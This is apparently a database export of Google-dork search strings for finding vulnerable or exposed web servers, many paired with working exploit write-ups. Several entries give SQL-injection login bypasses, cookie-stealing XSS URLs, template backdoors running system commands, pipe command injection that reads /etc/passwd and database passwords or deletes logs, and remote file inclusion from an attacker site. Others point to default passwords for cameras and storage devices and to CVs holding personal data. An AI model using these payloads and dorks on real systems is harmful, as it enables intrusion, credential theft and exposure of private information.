&quot;1&quot;;&quot;2003-06-24&quot;;&quot;"cacheserverreport for" "This analysis was produced by calamaris"&quot;;&quot;These are squid server cache reports. Fairly benign, really except when you consider using them for evil purposes. For example, an institution stands up a proxy server for their internal users to get to the outside world. Then, the internal user surf all over to their hearts content (including intranet pages cuz well, the admins are stupid) Voila, intranet links show up in the external cache report. Want to make matters worse for yourself as an admin? OK, configure your external proxy server as a trusted internal host. Load up your web browser, set your proxy as their proxy and surf your way into their intranet. Not that I&#039;ve noticed any examples of this in this google list. *COUGH* *COUGH* *COUGH*  unresolved DNS lookups give clues *COUGH* *COUGH* (&#039;scuse me. must be a furball) OK, lets say BEST CASE scenario. Let&#039;s say there&#039;s not security problems revealed in these logs. Best case scenario is that outsiders can see what your company/agency/workers are surfing.&quot;
&quot;1051&quot;;&quot;2005-08-07&quot;;&quot;"Powered by Gravity Board"&quot;;&quot;4.22 07/08/2005 Gravity Board X v1.1 (possibly prior versions) Remote code execution, SQL Injection / Login Bypass, cross site scripting, path disclosure poc software: author site: http://www.gravityboardx.com/ a) Sql Injection / Login Bypass: If magic_quotes off, A user can bypass login check and grant administrator privileges on target system: login: &#039; or isnull(1/0) /* password: whatever b) Cross site scripting poc: b.1)After he login as administrator he can edit template to insert evil javascript code. Try to insert at the end of the template these lines:  alert(document.cookie) b.2)A user can craft a malicious url like this to access target user cookies: http://[target]/[path]/deletethread.php?board_id=">alert(document.cookie) c) Remote commands/php code execution: c.1) Always editing the template, attacker can leave a backdoor in target system, example, at the end of template:   After, the attacker can launch commands by this urls: http://[target]/[path]/index.php?cmd=ls%20-la            to list directories... http://[target]/[path]/index.php?cmd=cat%20/etc/passwd to see Unix /etc/passwd file http://[target]/[path]/index.php?cmd=cat%20config.php to see database username/password c.2) An IMPORTANT NOTE: You can edit template without to be logged in as administator, calling editcss.php script, look at the code of this script: if($fp = fopen(&#039;gbxfinal.css&#039;,&#039;w&#039;)){ fwrite($fp, $csscontent); fclose($fp); echo &#039;&#039;; }else{ echo &#039;Gravity Board X was unable to save changes to the CSS template.&#039;; } you can easily deface the forum and/or insert a backdoor calling an url like this: http://[target]/[path]/editcss.php?csscontent= then execute commands: http://[target]/[path]/index?cmd=[command] It&#039;s also possible to disclose path: d) path disclosure: http://[target]/[path]/deletethread.php?perm=1 http://[target]/[path]/ban.php http://[target]/[path]/addnews.php http://[target]/[path]/banned.php http://[target]/[path]/boardstats.php http://[target]/[path]/adminform.php http://[target]/[path]/forms/admininfo.php http://[target]/[path]/forms/announcements.php http://[target]/[path]/forms/banform.php ans so on...calling scripts in /forms directory&quot;
&quot;1052&quot;;&quot;2005-08-07&quot;;&quot;"Powered by SilverNews"&quot;;&quot;silvernews 2.0.3 (possibly previous versions ) SQL Injection / Login Bypass / Remote commands execution / cross site scripting software: author site: http://www.silver-scripts.de/scripts.php?l=en&script=SilverNews SQL Injection / Login bypass: A user can bypass admin password check, if magic_quotes is set to off: user: &#039; or isnull(1/0) /* pass: whatever remote commands execution: now, new admin can edit template, clicking on Templates -> Global footer, can add the lines: //***********************************************   TEMPLATE; } } system($HTTP_GET_VARS[command]); /* to leave a backdoor in template file /templates/tpl_global.php now can launch system commands on the target system with theese urls: http://[target]/[path]//templates/tpl_global.php?command=ls%20-la to list directories http://[target]/[path]/templates/TPL_GLOBAL.PHP?command=cat%20/etc/passwd to see /etc/passwd file http://[target]/[path]/templates/TPL_GLOBAL.PHP?command=cat%20/[path_to_config_file]/data.inc.php to see Mysql database password cross site scripting: same way, a user can hide evil javascript code in template&quot;
&quot;1053&quot;;&quot;2005-08-07&quot;;&quot;PHPFreeNews inurl:Admin.php&quot;;&quot;29/07/2005 8.36.03PHPFreeNews Version 1.32 (& previous) sql injection/login bypass, cross site scripting, path disclosure, information disclosure  author site: http://www.phpfreenews.co.uk/Main_Intro.phpxss poc:http://[target]/[path]/inc/Footer.php?ScriptVersion=alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&NewsDir=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableRatings=1&NewsDir=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&NewsDir=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&PopupWidth=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&PopupHeight=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&PopupWidth=")}//-->alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&PopupHeight=")}//-->alert(document.cookie)also a user can craft a url to redirect a victim to an evil site:http://[target]/[path]/inc/Logout.php?AdminScript=http://[evil_site]/[evil_script]path disclosure:http://[target]/[path]/inc/ArchiveOldNews.phphttp://[target]/[path]/inc/Categories.phphttp://[target]/[path]/inc/CheckLogout.phphttp://[target]/[path]/inc/CommentsApproval.phphttp://[target]/[path]/inc/Images.phphttp://[target]/[path]/inc/NewsList.phphttp://[target]/[path]/inc/Password.phphttp://[target]/[path]/inc/Post.phphttp://[target]/[path]/inc/PostsApproval.phphttp://[target]/[path]/inc/PurgeOldNews.phphttp://[target]/[path]/inc/SetSticky.phphttp://[target]/[path]/inc/SetVisible.phphttp://[target]/[path]/inc/Statistics.phphttp://[target]/[path]/inc/Template.phphttp://[target]/[path]/inc/UserDefinedCodes.phphttp://[target]/[path]/inc/Users.phpinformation disclosure:googledork:PHPFreeNews inurl:Admin.php(with this, you can passively fingerprint the server, PHP & MySQL version are in Google description...because this info are shownwed with non-chalance in admin.php page ;) )default password:login: Adminpass: AdminMySQL Injection / Login Bypass in previous versions:login: Adminpassword: &#039;) or isnull(1/0) or (&#039;a&#039;=&#039;anote: all string, not consider &#039;or&#039;in 1.32 version LoginUsername and LoginPassword vars are addslashed... but, try this: login: whateverpass: //&#039;) or isnull(1/0) /* this is definetely patched in 1.40 version&quot;
&quot;1054&quot;;&quot;2005-08-07&quot;;&quot;inurl:nquser.php filetype:php&quot;;&quot;Netquery 3.1 remote commands execution, cross site scripting, information disclosure poc exploit software: author site: http://www.virtech.org/tools/ a user can execute command on target system by PING panel, if enabled like often happens, using pipe char on input text "Ping IP Address or Host Name", example: | cat /etc/passwd then you will see plain text password file | pwd to see current path | rm [pwd_output]/logs/nq_log.txt to delete log file... disclosure of user activity: if enabled, a user can view clear text log file through url: http://[target]/[path]/logs/nq_log.txt xss: http://[target]/[path]/submit.php?portnum="/>alert(document.cookie) http://[target]/[path]/nqgeoip2.php?step=alert(document.cookie) http://[target]/[path]/nqgeoip2.php?body=alert(document.cookie) http://[target]/[path]/nqgeoip.php?step=alert(document.cookie) http://[target]/[path]/nqports.php?step=alert(document.cookie) http://[target]/[path]/nqports2.php?step=alert(document.cookie) http://[target]/[path]/nqports2.php?body=alert(document.cookie) http://[target]/[path]/portlist.php?portnum=alert(document.cookie) a user can use on-line Netquery installations like proxy servers to launch exploit from HTTP GET request panel, example: exploiting Phpbb 2.0.15: make a get request of http://[vulnerable_server]/[path]/viewtopic.php?t=[existing_topic]&highlight=&#039;.system($HTTP_GET_VARS[command].&#039;&command=cat%20/etc/passwd&quot;
&quot;1055&quot;;&quot;2005-08-07&quot;;&quot;"Powered By: Simplicity oF Upload" inurl:download.php | inurl:upload.php&quot;;&quot;26/07/2005 16.09.18Simplicity OF Upload 1.3 (possibly prior versons) remote code execution & cross site scriptingsoftware: author site: http://www.phpsimplicity.com/scripts.php?id=3remote commands execution:problem at line 25-30: ...//check for language overriding..if (isset($_GET[&#039;language&#039;]))   $language = strtolower($_GET[&#039;language&#039;]);//now we include the language filerequire_once("$language.lng");...you can include whatever adding a null byte to "language" parameter value:example:http://localhost:30/simply/download.php?language=upload.php%00you will see upload & download page together :)so you can upload a cmd.gif (when you upload a .php file, usually it isrenamed to .html...)  file with this php code inside to executecommands:then try this url:http://[target]/[path]/download.php?language=cmd.gif%00&command=lsto list directorieshttp://[target]/[path]/download.php?language=cmd.gif%00&command=cat%20/etc/passwdto show /etc/passwd filecross site scripting:also, a remote user can supply a specially crafted URL to redirect other peopleto an evil page:http://[target]/[path]/download.php?language=http://[evil_site]/[evil_page]%00googledork:"Powered By: Simplicity oF Upload"&quot;
&quot;1056&quot;;&quot;2005-08-07&quot;;&quot;"Powered by FlexPHPNews" inurl:news | inurl:press&quot;;&quot;24/07/2005 2.38.13Flex PHPNews 0.0.4 login bypass/ sql injection, cross site scripting & resource consumption poc exploitsoftware:author site:http://www.china-on-site.com/flexphpnews/downloads.phpxss / cookie disclosure:http://[target]/[path]/index.php?front_indextitle=alert(document.cookie)http://[target]/[path]/index.php?front_searchsubmit=">alert(document.cookie)http://[target]/[path]/index.php?front_latestnews=">alert(document.cookie)http://[target]/[path]/news.php?newsid=">alert(document.cookie)http://[target]/[path]/news.php?front_rating=">alert(document.cookie)http://[target]/[path]/news.php?salt=">alert(document.cookie)http://[target]/[path]/news.php?front_letmerateit=">alert(document.cookie)http://[target]/[path]/news.php?front_ratebest=">alert(document.cookie)http://[target]/[path]/news.php?front_ratesubmit=">alert(document.cookie)http://[target]/[path]/news.php?front_searchsubmit=">alert(document.cookie)http://[target]/[path]/search.php?front_searchresult=alert(document.cookie)http://[target]/[path]/search.php?front_searchsubmit=">alert(document.cookie)http://[target]/[path]/catalog.php?front_searchsubmit=">alert(document.cookie)http://[target]/[path]/catalog.php?front_latestnews=">alert(document.cookie)http://[target]/[path]/catalog.php?catalogid=">alert(document.cookie)path disclosure:http://[target]/[path]/admin/usercheck.php?logincheck=%00denial of service / resources consumption:http://[target]/[path]/news.php?prenumber=99999999999999999999999999999999http://[target]/[path]/news.php?nextnumber=99999999999999999999999999999999($prenumber and $nextnumber are uninitialized final values of a loop...) sql injection / bypass authentication:go to login page:http://[target]/[path]/admin/(usually admin if not changed)login as user:   &#039; OR &#039;a&#039;=&#039;aand pass     :   &#039; OR &#039;a&#039;=&#039;a           boom! you&#039;re admin ...the problem is in usercheck.php at line 5:$sql = "select username from newsadmin where username=&#039;$checkuser&#039; and password=&#039;$checkpass&#039;";you can post always true statements, like &#039;a&#039;=&#039;a&#039;solution: replace $checkuser and $checkpass vars with your username and pass, by the moment&quot;
&quot;1057&quot;;&quot;2005-08-08&quot;;&quot;"Powered by FunkBoard"&quot;;&quot;FunkBoard V0.66CF (possibly prior versions) cross site scripting, possible database username/password disclosure & board takeover, possible remote code execution software: author site: http://www.[path_to_funkboard].co.uk/ xss: http://[target]/[path_to_funkboard]/editpost.php?fbusername=">alert(document.cookie) http://[target]/[path_to_funkboard]/editpost.php?fbpassword=">alert(document.cookie) http://[target]/[path_to_funkboard]/prefs.php?fbpassword=">alert(document.cookie) http://[target]/[path_to_funkboard]/prefs.php?fbusername=">alert(document.cookie) http://[target]/[path_to_funkboard]/newtopic.php?forumid=1&fbusername=">alert(document.cookie) http://[target]/[path_to_funkboard]/newtopic.php?forumid=1&fbpassword=">alert(document.cookie) http://[target]/[path_to_funkboard]/newtopic.php?forumid=1&subject=">alert(document.cookie) http://[target]/[path_to_funkboard]/reply.php?forumid=1&threadid=1&fbusername=">alert(document.cookie) http://[target]/[path_to_funkboard]/reply.php?forumid=1&threadid=1&fbpassword=">alert(document.cookie) http://[target]/[path_to_funkboard]/profile.php?fbusername=">alert(document.cookie) http://[target]/[path_to_funkboard]/profile.php?fbpassword=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?fbusername=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?fmail=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?www=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?icq=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?yim=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?location=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?sex=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?interebbies=">alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?sig=alert(document.cookie) http://[target]/[path_to_funkboard]/register.php?aim=">alert(document.cookie) path disclosure: http://[target]/[path_to_funkboard]/images/forums.php database username & password disclosure: during installation is not remembered to delete the mysql_install script and the installation do not delete it, usually: http://[target]/[path]/admin/mysql_install.php or http://[target]/[path]/admin/pg_install.php there, a user can see database clear text username & password ... Then, the script let the user proceed to the next page, where he can reset funkboard administator username & password. Now the script faults, because some tables exist, etc. So  user can go back and setting a new database name for installation, guessing among other installations on the server... Once Installation succeeded he can set new admin username e password then login at this page: http://[target]/[path]/[path_to_funkboard]/admin/index.php Now the user can edit templates and append some evil javascript code. remote code execution: look at this code in mysql_install.php : $infoout = " so, you have a backdoor on target system... you can launch commands by this urls: http://localhost:30/funkboard/info.php?command=ls%20-la to list directories... http://localhost:30/funkboard/info.php?command=cat%20/etc/passwd to see /etc/passwd file&quot;
&quot;1058&quot;;&quot;2005-08-07&quot;;&quot;"Summary View of Sensors" | "sensorProbe8 v *" | "&quot;;&quot;sensorProbe is a SNMP enabled and Web based Environmental Monitoring Device. The sensors attached to this device can monitor temperature, humidity, water leakage and air flow, etc. It does support other sensors which can monitor voltage drop, security, analog and dry contacts. The sensorProbe monitors your equipment&#039;s environmental variations, and alerts you through "Email , SMS or SNMP Alerts in your Network Management system" in advance and prevent any disaster.&quot;
&quot;1059&quot;;&quot;2005-08-08&quot;;&quot;intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button to co&quot;;&quot;[quote]Cisco CallManagerCallManager is a FREE web application/interface included with your VoIP telephone service. It allows you to change and update settings on your phone without having to contact the Telecommunications Help Desk.Voice over IP telephone users ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œLogon to Cisco CallManager at: http://XXXXXX/ccmuser/logon.asp* User ID ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œ your UWYO Domain username* Password ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã…â€œ initial password is 12341234Please create your own unique password after your initial logon[/quote]There are several vulnerbilities for CallManager&quot;
&quot;1060&quot;;&quot;2005-08-10&quot;;&quot;inurl:index.php fees shop link.codes merchantAccount&quot;;&quot;Vulnerability in EPay systemsPHP code includinghttp://targeturl/index.php?read=../../../../../../../../../../../../../../etc/passwdadvisory:http://www.cyberlords.net/advisories/cl_epay.txtEPay Pro version 2.0 is vulnerable to this issue.&quot;
&quot;1061&quot;;&quot;2005-08-16&quot;;&quot;intitle:"admin panel" +"Powered by RedKernel"&quot;;&quot;This finds all versions of RedKernel Referer Tracker(stats page) it just gives out some nice info&quot;
&quot;1062&quot;;&quot;2005-08-10&quot;;&quot;intitle:phpnews.login&quot;;&quot;Vulnerable script auth.php (SQL injection)--- from rst.void.ru ---Possible scenario of attack:[1] log in admin panel, using SQL injection[2] upload PHP file through "Upload Images" function (index.php?action=images) and have fun with php shellor edit template (index.php?action=modtemp) and put backdoor code into it.-------------------------http://www.securityfocus.com/bid/14333/infohttp://rst.void.ru/papers/advisory31.txtThe version number may be found sometimes in error messages.&quot;
&quot;1063&quot;;&quot;2005-08-10&quot;;&quot;intitle:"blog torrent upload"&quot;;&quot;Blog Torrent is free, open-source software that provides a way to share large files on your website.vulnerability: free access to the password filehttp://[target]/[path_of_blog]/data/newusersadvisory:http://www.securitytracker.com/alerts/2005/Jul/1014449.htmlAll current versions could be vulnerable depending on directory permissions.&quot;
&quot;1064&quot;;&quot;2005-08-15&quot;;&quot;intitle:MyShell 1.1.0 build 20010923&quot;;&quot;Basicly MyShell is a php program that allows you to execute commands remotely on whichever server it&#039;s hosted on.&quot;
&quot;1065&quot;;&quot;2005-08-12&quot;;&quot;http://www.google.com/search?q=intitle:%22Network+Storage+Link+for+USB+2.0+Disks%22+Firmware&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0&quot;;&quot;Networked USB hard drives (NSLU2).  Be sure to disable Google&#039;s filter (&filters=0) as that is where they pop up. Default password (Linksys) is admin:admin (just like all the rest).  A majority are locked some are not.  Some logins to the NSLU2 will be a link off a website. Enjoy.&quot;
&quot;1066&quot;;&quot;2005-08-15&quot;;&quot;intitle:"AlternC Desktop"&quot;;&quot;This finds the login page for AlternC Desktop I dont know what versions.&quot;
&quot;1067&quot;;&quot;2005-08-11&quot;;&quot;intitle:communigate pro entrance&quot;;&quot;Just reveals the login for Communigate Pro webmail. A brute force attack could be attempted. The directory link from this page can in some instances be used to query user information.&quot;
&quot;1068&quot;;&quot;2005-08-15&quot;;&quot;"inspanel" intitle:"login" -"cannot" "Login ID" -site:inspediumsoft.com&quot;;&quot;This finds all versions of the inspanel login page.&quot;
&quot;1069&quot;;&quot;2005-08-17&quot;;&quot;intitle:iDVR -intitle:"com | net | shop" -inurl:"asp | htm | pdf | html | php | shtml | com | at | cgi | tv"&quot;;&quot;Online camera. Default login is administrator and password blank. Video server runs default on port 2000. There is an application DVR Center that is used to connect to server and manage recorded videos.&quot;
&quot;1070&quot;;&quot;2005-08-14&quot;;&quot;"HostingAccelerator" intitle:"login" +"Username" -"news" -demo&quot;;&quot;This will find the login portal for HostingAccelerator ControlPanel I have not looked for exploits for these so i dont know if their are any. So far i have seen versions 1.9 2.2 and 2.4 found by this dork.&quot;
&quot;1071&quot;;&quot;2005-08-27&quot;;&quot;intitle:"INTELLINET" intitle:"IP Camera Homepage"&quot;;&quot;This googledork finds INTELLINET ip cameras.  They are used to monitor things and have a web interface.  Most of the pages load with the default username and password of guest.  The user manual says that the default admin username/password is admin/admin.  At the time of posting this googledork had 10 results.     p.s. This was discovered by jeffball55 and cleaned up by golfo&quot;
&quot;1072&quot;;&quot;2005-08-18&quot;;&quot;"Powered by Zorum 3.5"&quot;;&quot;Zorum 3.5 remote code execution poc exploitsoftware:description: Zorum is a freely available, open source Web-based forumapplication implemented in PHP. It is available for UNIX, Linux, and any otherplatform that supports PHP script execution.author site: http://zorum.phpoutsourcing.com/1) remote code execution:vulnerable code, in /gorum/prod.php file:07  $doubleApp = isset($argv[1]);    ...14   if( $doubleApp )15   {16      $appDir = $argv[1];17      system("mkdir $prodDir/$appDir");   ...a user can execute arbitrary commands using pipe char, example:http://[target]/zorum/gorum/prod.php?argv[1]=|ls%20-lato list directorieshttp://[target]/zorum/gorum/prod.php?argv[1]=|cat%20../config.phpto see database username/password...http://[target]/zorum/gorum/prod.php?argv[1]=|cat%20/etc/passwdto see /etc/passwd file2) path disclosure:http://[target]/zorum/gorum/notification.phphttp://[target]/zorum/user.phphttp://[target]/zorum/attach.phphttp://[target]/zorum/blacklist.phphttp://[target]/zorum/forum.phphttp://[target]/zorum/globalstat.phphttp://[target]/zorum/gorum/trace.phphttp://[target]/zorum/gorum/badwords.phphttp://[target]/zorum/gorum/flood.phpand so on...googledork:"Powered by Zorum 3.5"rgodsite: http://rgod.altervista.orgmail: retrogod at aliceposta itoriginal advisory: http://rgod.altervista.org/zorum.html&quot;
&quot;1073&quot;;&quot;2005-08-14&quot;;&quot;intitle:"xams 0.0.0..15 - Login"&quot;;&quot;This is the login for xams it should catch from 0.0.1-0.0.150.0.15 being the latest version as far as I can see their is only versions 0.0.13 0.0.14 and 0.0.15&quot;
&quot;1074&quot;;&quot;2005-08-12&quot;;&quot;intitle:"curriculum vitae" filetype:doc&quot;;&quot;Hello. 1. It reveals personal datas, often private addresses, phone numbers, e-mails, how many children one has:). Full curriculum vitae. I tried many verions of it:inurl:"pl" intitle:"curriculum vitae" filetype:docinurl:"uk" intitle:"curriculum vitae" filetype:docinurl:"nl" intitle:"curriculum vitae" filetype:doc, etc. in order to get national results,alsointitle:"curriculum vitae" ext:(doc | rtf )However filetype:doc version gives the most results. 2. You can always do someting with someone phone number, date and place of birth, etc. I placed this string in the forum, but nobody answered me :(. GreetingsphilYps. you have something similar in your GHDB, but different."Click here for the Google search ==> "phone * * *" "address *" "e-mail" intitle:"curriculum vitae"(opens in new window)Added: Thursday, August 19, 2004hits: 24771"&quot;
&quot;1075&quot;;&quot;2005-08-16&quot;;&quot;"There seems to have been a problem with the" " Please try again by clicking the Refresh button in your web browser."&quot;;&quot;search reveals database errors on vbulletin sites. View the page source and you can get information about the sql query executed, this can help in all manner of ways depending on the query.&quot;
&quot;1076&quot;;&quot;2005-08-28&quot;;&quot;inurl:csCreatePro.cgi&quot;;&quot;Create Pro logon pages.&quot;
&quot;1077&quot;;&quot;2005-08-30&quot;;&quot;"Powered by FUDForum 2.6" -site:fudforum.org -johnny.ihackstuff&quot;;&quot;FUDforum is prone to a remote arbitrary PHP file upload vulnerability.An attacker can merge an image file with a script file and upload it to an affected server.This issue can facilitate unauthorized remote access.FUDforum versions prior to 2.7.1 are reported to be affected. Currently Symantec cannot confirm if version 2.7.1 is affected as well.Affected versions:2.6.15 _ 2.6.14 _ 2.6.132.6.12 _ 2.6.10 _ 2.6.9 _ 2.6.82.6.7 _ 2.6.5 _ 2.6.4 _ 2.6.32.6.2 _ 2.6.1 _ 2.6&quot;
&quot;1078&quot;;&quot;2005-09-19&quot;;&quot;intitle:"Looking Glass v20040427" "When verifying&quot;;&quot;Looking Glass v20040427 arbitrary commands execution / cross site scripting. description: Looking Glass is a pretty extensive web based network querying tool for use on php enabled servers.  site: http://de-neef.net/articles.php?id=2&page=1download page: http://de-neef.net/download.php?file=2Read the full report here: http://rgod.altervista.org/lookingglass.html&quot;
&quot;1079&quot;;&quot;2005-08-23&quot;;&quot;contacts ext:wml&quot;;&quot;Forget Bluetooth Hacking! You&#039;ll be amazed, at how many people sync their Cell Phones to the same Computers they run some type of Server on. This Query literally gives you access to peoples private contact lists that are ether on there  Smart Phones&#039;, or on their Windows CE wireless devices.An attacker could Spoof Emails with the "SIG" details of the persons Phone firmware, or simply collect the cellular numbers for something later on down the road.I even hypotheticlly came across some private text messages!&quot;
&quot;1080&quot;;&quot;2005-09-06&quot;;&quot;intitle:"NetCam Live Image" -.edu -.gov -johnny.ihackstuff.com&quot;;&quot;This is a googledork for StarDot netcams.  You can watch these cams and if you have the admin password you can change configurations and other settings.  They have a default admin name/pass but I haven&#039;t taken the time to figure it out.&quot;
&quot;1081&quot;;&quot;2005-08-30&quot;;&quot;intitle:"Content Management System" "user name"|"password"|"admin" "Microsoft IE 5.5" -mambo -johnny.ihackstuff&quot;;&quot;iCMS - Content Management System...Create websites without knowing HTML or web programming.&quot;
&quot;1082&quot;;&quot;2005-08-29&quot;;&quot;phpLDAPadmin intitle:phpLDAPadmin filetype:php inurl:tree.php | inurl:login.php | inurl:donate.php (0.9.6 | 0.9.7)&quot;;&quot;phpLDAPadmin 0.9.6 - 0.9.7/alpha5 (possibly prior versions) system disclosure,remote code execution, cross site scriptingsoftware:author site: http://phpldapadmin.sourceforge.net/description: phpLDAPadmin is a web-based LDAP client. It provides easy,anywhere-accessible, multi-language administration for your LDAP serverIf unpatched and vulnerable, a user can see any file on target system. A user can also execute arbitrary php code and system commands or craft a malicious url to include malicious client side code that will be executed in the security contest of the victim browser.&quot;
&quot;1083&quot;;&quot;2005-08-21&quot;;&quot;"powered by ITWorking"&quot;;&quot;saveWebPortal 3.4 remote code execution / admin check bypass / remote fileinclusion / cross site scripting author site: http://www.circeos.itdownload page: http://www.circeos.it/frontend/index.php?page=downloadsa) remote code execution:a user can bypass admin check, calling this url:http://[target]/saveweb/admin/PhpMyExplorer/editerfichier.php?chemin=.&fichier=header.php&type=Sourcenow can leave a backdoor in header.php or some other file, example:after editing template, user can execute arbitrary system commands, through aurl like this:http://[target]/saveweb/header.php?command=ls%20-lato list directories...http://[target]/saveweb/header.php?command=cat%20config.inc.phpto see database username/password and admin panel username/password (now attacker have full access to site configuration... can go tohttp://[target]/saveweb/admin/to login...)http://[target]/saveweb/header.php?command=cat%20/etc/passwdto see passwd file...b) arbitrary file inclusion:a user can view any file on the target server,if not with .php extension:http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../boot.ini%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../boot.ini%00can execute arbitrary file resident on target server, if with .php extension,example :http://[target]/saveweb/menu_dx.php?SITE_Path=../../../../../[script].php%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../[script].php%00can craft a malicious url to cause victim user to execute commands on externalsite:http://[target]/saveweb/menu_dx.php?SITE_Path=http://[external_site]/cmd.gif%00http://[target]/saveweb/menu_sx.php?CONTENTS_Dir=http://[external_site]/cmd.gif%00where cmd.gif is a file like this:c) xss:c.1)http://[target]/saveweb/footer.php?TABLE_Width=>alert(document.cookie)http://[target]/saveweb/footer.php?SITE_Author_Domain=>alert(document.cookie)http://[target]/saveweb/footer.php?SITE_Author=>alert(document.cookie)http://[target]/saveweb/footer.php?L_Info=>alert(document.cookie)http://[target]/saveweb/footer.php?L_Help=>alert(document.cookie)http://[target]/saveweb/header.php?TABLE_Width=>alert(document.cookie)http://[target]/saveweb/header.php?L_Visitors=>alert(document.cookie)http://[target]/saveweb/header.php?count=>alert(document.cookie)http://[target]/saveweb/header.php?SITE_Logo=">alert(document.cookie)http://[target]/saveweb/header.php?BANNER_Url=">alert(document.cookie)http://[target]/saveweb/header.php?L_Sunday="}alert(document.cookie)&quot;
&quot;1084&quot;;&quot;2005-08-30&quot;;&quot;intitle:guestbook inurl:guestbook "powered by Adva&quot;;&quot;Advanced Guestbook is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.&quot;
&quot;1085&quot;;&quot;2005-08-30&quot;;&quot;intext:"Master Account" "Domain Name" "Password" inurl:/cgi-bin/qmailadmin&quot;;&quot;qmail mail admin login pages.There are several vulnerabilities relating to this software&quot;
&quot;1086&quot;;&quot;2005-08-30&quot;;&quot;intitle:"web-cyradm"|"by Luc de Louw" "This is only for authorized users" -tar.gz -site:web-cyradm.org -johnny.ihackstuff&quot;;&quot;Web-cyradm is a software that glues topnotch mailing technologies together. The focus is on administrating small and large mailing environments.Web-cyradm is used by many different users. At the low end this are homeusers which are providing mailadresses to their family. On the mid to top end users are SME enterprises, educational and other organizations.The software on which web-cyradm relies on is completely free and opensource software. So you get the maximung flexibility which the lowest TCO.&quot;
&quot;1087&quot;;&quot;2005-08-30&quot;;&quot;"Powered by FUDForum 2.7" -site:fudforum.org -johnny.ihackstuff&quot;;&quot;FUDforum is prone to a remote arbitrary PHP file upload vulnerability.An attacker can merge an image file with a script file and upload it to an affected server.This issue can facilitate unauthorized remote access.FUDforum versions prior to 2.7.1 are reported to be affected. Currently Symantec cannot confirm if version 2.7.1 is affected as well.Affected versions:2.7&quot;
&quot;1088&quot;;&quot;2005-08-30&quot;;&quot;"You have requested to access the management functions"  -.edu&quot;;&quot;Terracotta web manager admin login portal.&quot;
&quot;1089&quot;;&quot;2005-08-30&quot;;&quot;"Please authenticate yourself to get access to the management interface"&quot;;&quot;Photo gallery managment system login&quot;
&quot;1090&quot;;&quot;2005-08-31&quot;;&quot;ext:inc "pwd=" "UID="&quot;;&quot;Database connection strings including passwords&quot;
